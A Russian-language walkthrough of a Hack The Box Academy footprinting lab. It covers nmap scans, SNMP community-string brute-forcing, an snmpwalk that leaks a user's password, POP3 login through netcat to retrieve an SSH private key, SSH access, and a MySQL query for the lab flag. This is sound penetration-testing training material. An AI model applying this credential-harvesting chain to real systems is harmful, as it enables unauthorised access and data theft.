# Hack The Box Academy — Footprinting Lab

**Дата выполнения:** 3 октября 2026  
**Цель:** `10.129.202.20`  
**Hostname:** `NIXHARD`

## Краткий итог

Первичное перечисление цели показало SSH, POP3 и IMAP по TCP, а отдельное UDP-сканирование обнаружило SNMP на `161/udp`.

Через перебор SNMP community strings была найдена строка `backup`. Несмотря на то что Nmap определял службу как SNMPv3, найденная community string позволила успешно выполнить запросы через SNMPv2c.

Полный `snmpwalk` раскрыл запись, связанную со скриптом `/opt/tom-recovery.sh`, в которой присутствовали учётные данные пользователя `tom`. После проверки этих данных через почтовые службы удалось войти в POP3 и получить письмо с приватным SSH-ключом.

Ключ был сохранён локально, проверен через `ssh-keygen`, после чего с ним удалось войти по SSH как `tom`. Уже внутри системы история команд пользователя указала на локальный MySQL. После входа в MySQL была найдена база `users`, таблица `users`, а затем запись пользователя `HTB`.

Цепочка получилась такой:

```text
TCP/UDP enumeration
    ↓
SNMP 161/udp
    ↓
community string: backup
    ↓
SNMP walk
    ↓
учётные данные tom
    ↓
POP3
    ↓
приватный SSH-ключ
    ↓
SSH как tom
    ↓
.mysql_history / .bash_history
    ↓
локальный MySQL
    ↓
database users
    ↓
table users
    ↓
запись HTB
```

## 1. Первичное TCP-перечисление

Первый скан выполнялся с определением версий служб и стандартными NSE-скриптами:

```bash
nmap -sV -sC 10.129.202.20
```

Были обнаружены:

```text
22/tcp   open  ssh
110/tcp  open  pop3
143/tcp  open  imap
993/tcp  open  ssl/imap
995/tcp  open  ssl/pop3
```

SSH работал на OpenSSH 8.2p1 Ubuntu. Почтовые службы обслуживались Dovecot, а TLS-сертификаты содержали имя узла `NIXHARD`.

Таким образом, уже после первого сканирования были известны три основных направления: SSH, IMAP и POP3.

## 2. UDP и обнаружение SNMP

Так как обычный TCP-скан UDP-службы не показывает, был отдельно выполнен UDP-скан:

```bash
sudo nmap -sU -sV -sC 10.129.202.20
```

В результате был найден:

```text
161/udp open snmp
```

Nmap сообщил о `net-snmp` и определил службу как SNMPv3 server.

Дополнительно был запущен набор SNMP NSE-скриптов:

```bash
sudo nmap -sU 10.129.202.20 -p161 -sV --script "snmp-*"
```

Однако полезной community string стандартные скрипты не показали.

## 3. Поиск community string

Для перебора использовался `onesixtyone`. Короткие списки community strings результата не дали, поэтому был использован более крупный словарь SecLists:

```bash
onesixtyone \
  -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt \
  10.129.202.20 -w 100
```

Результат:

```text
10.129.202.20 [backup] Linux NIXHARD ...
```

Таким образом, была найдена community string:

```text
backup
```

Попытка использовать её как SNMPv3-параметр была неправильной:

```bash
snmpwalk -v3 -c backup 10.129.202.20
```

SNMPv3 требует `securityName`, а `-c` относится к community-based SNMP. Поэтому рабочим оказался SNMPv2c:

```bash
snmpwalk -v2c -c backup 10.129.202.20
```

## 4. SNMP enumeration

Полный `snmpwalk` раскрыл большое количество системной информации: hostname, ядро Linux, контакт администратора и системные объекты.

Особенно интересной оказалась ветка Host Resources MIB:

```text
STRING: "/opt/tom-recovery.sh"
STRING: "tom NMds732Js2761"
```

Рядом также находился вывод работы `chpasswd`, относящийся к пользователю `tom`.

Это позволило выделить потенциальные учётные данные:

```text
tom
NMds732Js2761
```

На этом этапе SNMP дал не просто информацию о системе, а данные, которые можно было проверить на других доступных службах.

## 5. Проверка IMAP

Поскольку IMAP был доступен на портах `143` и `993`, сначала была проверена аутентификация:

```text
1 LOGIN tom NMds732Js2761
```

Сервер ответил:

```text
OK ... Logged in
```

После этого были перечислены папки:

```text
Notes
Meetings
Important
INBOX
```

Однако выбранные папки `Important`, `Notes` и `Meetings` содержали `0 EXISTS`, поэтому полезного сообщения через этот путь найдено не было.

## 6. POP3

Следующим направлением стал POP3 на `110/tcp`:

```bash
nc -nv 10.129.202.20 110
```

Аутентификация:

```text
USER tom
PASS NMds732Js2761
```

оказалась успешной.

Команда:

```text
STAT
```

показала:

```text
+OK 1 3661
```

То есть в почтовом ящике находилось одно сообщение размером 3661 байт.

Через:

```text
LIST
UIDL
TOP 1 5
```

была получена информация о сообщении, а затем:

```text
RETR 1
```

вывела его полностью.

В теле письма находился:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

Таким образом, почтовый ящик пользователя `tom` содержал его приватный SSH-ключ.

## 7. Подготовка SSH-ключа

Сначала были несколько неудачных попыток сохранить большой многострочный ключ через `echo` и heredoc. Это привело к повреждению содержимого и попыткам shell интерпретировать строки ключа как команды.

Рабочий вариант был сохранён в файл `s`, после чего права были ограничены:

```bash
chmod 600 s
```

Проверка корректности ключа:

```bash
ssh-keygen -y -f s
```

успешно вернула публичный RSA-ключ с комментарием:

```text
tom@NIXHARD
```

Это подтвердило, что приватный ключ записан корректно.

## 8. SSH-доступ

После этого был выполнен вход:

```bash
ssh -i s tom@10.129.202.20
```

SSH-аутентификация прошла успешно, и была получена оболочка:

```text
tom@NIXHARD:~$
```

Система работала на Ubuntu 20.04.3 LTS.

## 9. Перечисление домашнего каталога

В домашнем каталоге были обнаружены:

```text
.bash_history
.mysql_history
.ssh
Maildir
```

Особенно интересными оказались история MySQL и история shell:

```bash
cat .mysql_history
cat .bash_history
```

В `.mysql_history` находились команды:

```text
show databases;
use users;
select * from users;
```

А `.bash_history` содержала:

```text
mysql -u tom -p
```

Это показывало, что пользователь `tom` ранее подключался к локальной MySQL и работал с базой `users`.

## 10. MySQL

Был запущен клиент:

```bash
mysql -u tom -p
```

После успешной аутентификации сервер сообщил:

```text
Server version: 8.0.27-0ubuntu0.20.04.1
```

Первоначальная команда:

```sql
SELECT * FROM users;
```

вернула:

```text
ERROR 1046 (3D000): No database selected
```

Поэтому сначала были перечислены базы:

```sql
SHOW DATABASES;
```

Среди них присутствовала:

```text
users
```

После выбора:

```sql
USE users;
```

были перечислены таблицы:

```sql
SHOW TABLES;
```

Результат:

```text
users
```

Структура таблицы:

```sql
DESCRIBE users;
```

показала столбцы:

```text
id
username
password
```

## 11. Получение целевой записи

Вместо повторного вывода всей таблицы целевую запись можно было получить точечным запросом:

```sql
SELECT username, password
FROM users
WHERE username = 'HTB';
```

Результат:

```text
HTB | cr3n4o7rzse7rzhnckhssncif7ds
```

Таким образом, лаборатория была завершена.

## Итог

Ключевой особенностью этой лаборатории было то, что итоговые данные не находились в одной службе. Нужно было связать результаты нескольких этапов:

```text
SNMP → credentials → POP3 → SSH key → SSH → MySQL
```

Особенно важными практическими моментами были отдельное UDP-перечисление, переход от общего `snmpwalk` к интересным Host Resources объектам, различение SNMPv2c и SNMPv3, ручная работа с POP3, корректное сохранение многострочного SSH-ключа и последовательное перечисление структуры MySQL перед целевым `SELECT`.
